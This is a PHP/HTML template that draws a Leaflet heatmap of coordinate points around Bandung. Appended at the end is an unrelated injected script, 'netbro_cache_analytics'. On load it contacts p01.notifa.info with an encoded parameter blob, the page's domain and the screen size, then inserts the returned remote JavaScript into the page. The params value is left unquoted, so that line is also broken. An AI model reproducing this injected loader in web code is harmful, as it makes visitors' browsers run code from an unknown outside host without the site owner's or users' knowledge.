
<!DOCTYPE html>
<html>
<head lang='en'>
  <meta charset='utf-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.6.0/dist/leaflet.css" integrity="sha512-xwE/Az9zrjBIphAcBb3F6JVqxf46+CDLwfLMHloNu6KEQCAWi6HcDUbeOfBIptF7tcCzusKFjFw2yuvEpDL9wQ==" crossorigin=""/>
  <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css"/>
  <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css"/>
  <script src="<?= base_url() ?>petapanas/dist/leaflet-heat.js"></script>

    <script src="http://leaflet.github.io/Leaflet.markercluster/example/realworld.10000.js"></script>
  <style>
    html, body {margin:0;padding:0;}
    #map {width:100%;height:380px;}
    .leaflet-popup-content-wrapper {border-radius: 0px !important;}
  </style>
</head>
<body>
<div class="main-content" style="margin-top:-440px;">
<br/><p></p>
  <div id='map'></div>
   <script>
    // declare variable as global
    // var map;
    // // declare basemap -- OSM
    // var OpenStreetMapLayer = new L.TileLayer("http://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
    //   minZoom: 8, 
    //   maxZoom: 30, 
    //   attribution: `Map Data &copy; <a href='http://openstreetmap.org'>OpenStreetMap</a> contributors.`
    // });

    var map = L.map('map').setView([-6.923648, 107.615584], 12);

    var tiles = L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {
        attribution: '&copy; <a href="http://osm.org/copyright">OpenStreetMap</a> contributors',
    }).addTo(map);
    // GeoJSON object
    <?php    
    $heatmapData=array();
    ?>

        var heatmap = L.heatLayer([
            <?php foreach($tps as $key){?>
            [<?= $key['latitude']?>, <?= $key['longitude']?>, 571],
            <?php } ?>
        ], {radius: 25}).addTo(map);

        var heat = L.heatLayer(heatmap).addTo(map);
  
  
  </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXxd6YnB%2fcjR7EJEEkLOqYLWMYWLBFZg0wMjUPqmbCdN64GwXbaFlsW%2bYkP%2b5Vf71Q4f4J14O8p%2fZEXK%2fSzLQB8gJjiHvoInk%2bCJ3Qa%2bBh7DlfnI3Ma%2flyEphcb2WfQGh%2fOEB2mGsNJBFufQJ4%2bbkb8Nc%2fRzVPjJcS%2b94t9vTIJwiRQ0NEIL90T03Rp0u168G5ehfzMzR5va49WxxROVc2uFWw8gMFVtFTMz%2fqYb2vKh1b0JPLrLGg8HGpjcE0Ok9bhPWOnPY3EhTs7UkpWGJRIOtOQaryQA8DQwo0lX%2flym61TJfHt9Rz8%2bDla49qcgnnAQBh0GB0Gra%2fcw%2fH1OJoBujBPvvvM%2fjQVDT25SNKZr9a8QNsSulHA0f%2f2Vysi587q5uYZaWg%2bzOVUeA4Lt9zM2b1JROOt%2bmYuSb4pRCxwV9HLh%2frjwpDEXz%2bImLWAnhXWtbM8R7qgjLYGZ%2b4JhK3g1SzXNTm0uFOD449v7sXYfkkBmm02Lf2yXQZ1RsDPgkaGPxYhISX%2b92xP9swK9ZxDxUD1c5BGqgCwCpgx09O8zB%2bpM4KM5y1%2fA%3d%3d + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</div>
</html>